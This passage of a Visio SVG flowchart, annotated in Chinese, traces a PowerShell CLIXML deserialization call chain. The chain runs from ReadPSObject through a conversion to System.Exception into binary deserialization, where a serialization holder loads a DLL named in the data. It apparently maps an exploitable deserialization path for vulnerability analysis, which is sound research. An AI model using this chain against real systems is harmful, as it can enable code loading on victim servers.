v:mID="4" v:index="1" v:groupContext="backgroundPage"><v:userDefs><v:ud v:nameU="msvVisioCreated" v:prompt="" v:val="VT0(0):26"/></v:userDefs><title>背景 1</title><v:pageProperties width="10.4331" height="18.8976" v:drawingScale=".0393701" v:pageScale=".0393701" v:drawingUnits="24" v:shadowOffsetX="8.50394" v:shadowOffsetY="-8.50394"/><g id="shape2-1" v:mID="2" v:groupContext="shape"><title>Center Gradient</title><v:userDefs><v:ud v:nameU="Background" v:val="VT0(0):26"/><v:ud v:nameU="visVersion" v:val="VT0(15):26"/><v:ud v:nameU="msvShapeCategories" v:prompt="" v:val="VT4(DoNotContain)"/><v:ud v:nameU="msvVisioCreated" v:prompt="" v:val="VT0(0):26"/></v:userDefs><rect x="0" y="0" width="751.181" height="1360.63" class="st1"/></g></g><g v:mID="0" v:index="2" v:groupContext="foregroundPage"><v:userDefs><v:ud v:nameU="msvThemeOrder" v:val="VT0(0):26"/></v:userDefs><title>页-1</title><v:pageProperties v:drawingScale=".0393701" v:pageScale=".0393701" v:drawingUnits="24" v:shadowOffsetX="8.50394" v:shadowOffsetY="-8.50394"/><v:layer v:name="流程图" v:index="0"/><v:layer v:name="连接线" v:index="1"/><g id="shape7-5" v:mID="7" v:groupContext="shape" v:layerMember="0" transform="translate(108.725,-1026.2)"><title>流程</title><desc>ReadOneObject</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1335.88" width="103.14" height="49.5068"/><rect x="0" y="1311.12" width="103.139" height="49.5068" class="st2"/><text x="23.69" y="1338.28" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadOneObject</text></g><g id="shape8-8" v:mID="8" v:groupContext="shape" v:layerMember="0" transform="translate(78.3257,-894.183)"><title>流程.8</title><desc>ReadOneDeserializedObject 遍历XML树的标签</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="82.5114" cy="1335.88" width="165.03" height="49.5068"/><rect x="0" y="1311.12" width="165.023" height="49.5068" class="st2"/><text x="33.36" y="1333.08" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadOneDeserializedObject<v:newlineChar/><tspan x="50.68" dy="1.275em" class="st4" v:langID="2052">遍历</tspan><tspan class="st5" v:langID="2052">XML</tspan><tspan class="st4" v:langID="2052">树的标签</tspan></text></g><g id="shape10-14" v:mID="10" v:groupContext="shape" v:layerMember="1" transform="translate(153.479,-1026.2)"><title>动态连接线</title><desc>调用读取一个反序列化对象 object obj = this.ReadOneDeserializedObject</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="7.35803" cy="1401.61" width="168.1" height="28.0064"/><path d="M6.82 1360.63v21.26h.54V1437.1" class="st6"/><rect v:rectContext="textBkgnd" x="-71.5903" y="1391.61" width="157.897" height="20.0025" class="st8"/><text x="-44.64" y="1399.42" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用，读取一个反序列化对象<v:newlineChar/><tspan x="-71.59" dy="1.225em" class="st10" v:langID="1033">object obj</tspan><tspan class="st10" v:langID="1033">=</tspan><tspan class="st10" v:langID="1033">this</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">ReadOneDeserializedObject</tspan></text></g><g id="shape12-27" v:mID="12" v:groupContext="shape" v:layerMember="1" transform="translate(153.751,-894.183)"><title>动态连接线.12</title><desc>碰到Obj标签调用读取一个Obj对象 if (this.IsNextElement("Obj")){ return thi...</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="7.08661" cy="1391.57" width="147.54" height="37.6064"/><path d="M7.09 1360.63V1416.47" class="st6"/><rect v:rectContext="textBkgnd" x="-61.5847" y="1376.77" width="137.343" height="29.6027" class="st8"/><text x="-61.58" y="1384.57" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>碰到<tspan class="st10">Obj</tspan>标签，调用，读取一个<tspan class="st10">Obj</tspan>对象<v:newlineChar/><tspan x="-44.17" dy="1.225em" class="st10" v:langID="1033">if</tspan><tspan class="st10" v:langID="1033">(</tspan><tspan class="st10" v:langID="1033">this</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">IsNextElement</tspan><tspan class="st10" v:langID="1033">("</tspan><tspan class="st10" v:langID="1033">Obj</tspan><tspan class="st10" v:langID="1033">"))</tspan><tspan class="st10" v:langID="1033">{<v:newlineChar/></tspan><tspan x="-41.28" dy="1.2em" class="st10" v:langID="1033">return this</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">ReadPSObject</tspan><tspan class="st10" v:langID="1033">()</tspan><tspan class="st10" v:langID="1033">;}</tspan></text></g><g id="shape11-50" v:mID="11" v:groupContext="shape" v:layerMember="0" transform="translate(109.268,-770.416)"><title>流程.11</title><desc>ReadPSObject 读取一个Obj对象</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="26.7" y="1326.89" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadPSObject<v:newlineChar/><tspan x="21.23" dy="1.275em" class="st4" v:langID="2052">读取一个</tspan><tspan class="st5" v:langID="2052">Obj</tspan><tspan class="st4" v:langID="2052">对象</tspan></text></g><g id="shape14-56" v:mID="14" v:groupContext="shape" v:layerMember="1" transform="translate(155.542,-770.416)"><title>动态连接线.14</title><desc>碰到Props标签调用读取Props标签 if (this.IsNextElement("Props")){ this.R...</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="8.87798" cy="1402.16" width="146.29" height="37.6064"/><path d="M5.3 1360.63v21.26H8.88V1441.23" class="st6"/><rect v:rectContext="textBkgnd" x="-59.1685" y="1387.36" width="136.093" height="29.6027" class="st8"/><text x="-59.17" y="1395.16" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>碰到<tspan class="st10">Props</tspan>标签，调用，读取<tspan class="st10">Props</tspan>标签<v:newlineChar/><tspan x="-46.06" dy="1.225em" class="st10" v:langID="1033">if</tspan><tspan class="st10" v:langID="1033">(</tspan><tspan class="st10" v:langID="1033">this</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">IsNextElement</tspan><tspan class="st10" v:langID="1033">("</tspan><tspan class="st10" v:langID="1033">Props</tspan><tspan class="st10" v:langID="1033">"))</tspan><tspan class="st10" v:langID="1033">{<v:newlineChar/></tspan><tspan x="-44.57" dy="1.2em" class="st10" v:langID="1033">this</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">ReadProperties</tspan><tspan class="st10" v:langID="1033">(</tspan><tspan class="st10" v:langID="1033">psobject</tspan><tspan class="st10" v:langID="1033">)</tspan><tspan class="st10" v:langID="1033">;}</tspan></text></g><g id="shape13-81" v:mID="13" v:groupContext="shape" v:layerMember="0" transform="translate(112.85,-621.896)"><title>流程.13</title><desc>ReadProperties</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="24.77" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadProperties</text></g><g id="shape16-84" v:mID="16" v:groupContext="shape" v:layerMember="1" transform="translate(215.989,-652.838)"><title>动态连接线.16</title><desc>调用读取嵌套对象</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="157.092" cy="1170.55" width="82.2" height="28.0064"/><path d="M0 1360.63H33.36a3 3 0 016 0H89.19a3 3 0 016 0h60.48V953.07h15.22" class="st6"/><rect v:rectContext="textBkgnd" x="121.092" y="1160.55" width="71.9997" height="20.0025" class="st8"/><text x="121.09" y="1168.35" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用，读取嵌套对象<v:newlineChar/></text></g><g id="shape15-91" v:mID="15" v:groupContext="shape" v:layerMember="0" transform="translate(392.924,-1029.46)"><title>流程.15</title><desc>ReadOneObject</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="23.69" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadOneObject</text></g><g id="shape20-94" v:mID="20" v:groupContext="shape" v:layerMember="1" transform="translate(441.932,-1029.46)"><title>动态连接线.20</title><desc>调用将反序列化数据 转换为目标类型此时目标类型为System.Exception</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="11.6116" cy="1400.52" width="191.4" height="38.4093"/><path d="M2.56 1360.63v21.26h9.05v61.53" class="st6"/><rect v:rectContext="textBkgnd" x="-78.9875" y="1385.32" width="181.198" height="30.4055" class="st8"/><text x="-28.39" y="1393.12" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用，将反序列化数据<v:newlineChar/><tspan x="-78.99" dy="1.3em" class="st5">转换为目标类型</tspan>，此时目标类型为<tspan class="st10">System</tspan><tspan class="st10">.</tspan><tspan class="st10">Exception</tspan><v:newlineChar/></text></g><g id="shape19-105" v:mID="19" v:groupContext="shape" v:layerMember="0" transform="translate(401.974,-878.74)"><title>流程.19</title><desc>ConvertTo</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="33.29" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ConvertTo</text></g><g id="shape22-108" v:mID="22" v:groupContext="shape" v:layerMember="1" transform="translate(505.113,-909.682)"><title>动态连接线.22</title><desc>一系列调用</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="119.807" cy="1360.63" width="50.2" height="18.4064"/><path d="M0 1360.63H151.98V1442.22" class="st6"/><rect v:rectContext="textBkgnd" x="99.807" y="1355.43" width="39.9998" height="10.403" class="st8"/><text x="99.81" y="1363.23" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>一系列调用</text></g><g id="shape21-115" v:mID="21" v:groupContext="shape" v:layerMember="0" transform="translate(605.522,-760.164)"><title>流程.21</title><desc>Object.Reader.Deserialize</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="6.93" y="1332.09" class="st3" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>Object.Reader.<tspan class="st5" v:langID="1033">Deserialize</tspan></text></g><g id="shape24-119" v:mID="24" v:groupContext="shape" v:layerMember="1" transform="translate(661.617,-760.164)"><title>动态连接线.24</title><desc>调用解析内存中的序列化数据</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="-9.64826" cy="1403.78" width="122.2" height="18.4064"/><path d="M-4.52 1360.63v21.26H-9.65V1446.02" class="st6"/><rect v:rectContext="textBkgnd" x="-65.6479" y="1398.58" width="112" height="10.403" class="st8"/><text x="-65.65" y="1406.38" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用，解析内存中的序列化数据</text></g><g id="shape23-126" v:mID="23" v:groupContext="shape" v:layerMember="0" transform="translate(600.399,-606.854)"><title>流程.23</title><desc>__BinaryParser.Run</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1329.69" width="103.14" height="61.8835"/><rect x="0" y="1298.75" width="103.139" height="61.8835" class="st2"/><text x="18.73" y="1332.09" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>__BinaryParser<tspan class="st5" v:langID="2052">.</tspan><tspan class="st5" v:langID="2052">Run</tspan></text></g><g id="shape28-131" v:mID="28" v:groupContext="shape" v:layerMember="1" transform="translate(647.444,-606.854)"><title>动态连接线.28</title><path d="M4.52 1360.63v21.26H9.65v26.8" class="st6"/></g><g id="shape27-136" v:mID="27" v:groupContext="shape" v:layerMember="0" transform="translate(605.522,-445.491)"><title>流程.27</title><desc>将序列化数据解析为System.UnitySerializationHolder对象并载入m_assmblyName对应的...</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.62992125984252):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1307" width="103.14" height="107.265"/><rect x="0" y="1253.37" width="103.139" height="107.265" class="st2"/><text x="15.57" y="1294.19" class="st11" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>将序列化数据解析为<tspan x="2.27" dy="1.2em" class="st10" v:langID="1033">System</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">UnitySerializationHo</tspan><tspan x="20.76" dy="1.275em" class="st10" v:langID="1033">lder</tspan>对象，并载入<tspan x="3.2" dy="1.3em" class="st10">m</tspan><tspan class="st10">_</tspan><tspan class="st10">assmblyName</tspan>对应的<tspan class="st10">DLL</tspan></text></g><g id="shape39-147" v:mID="39" v:groupContext="shape" v:layerMember="1" transform="translate(450.982,-878.74)"><title>动态连接线.39</title><path d="M2.56 1360.63v21.26h9.05V1427.98" class="st6"/></g><g id="shape38-152" v:mID="38" v:groupContext="shape" v:layerMember="0" transform="translate(411.024,-722.835)"><title>流程.38</title><desc>转化为在m_assmblyName对应的DLL中的m_data对应类型的Type对象</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" 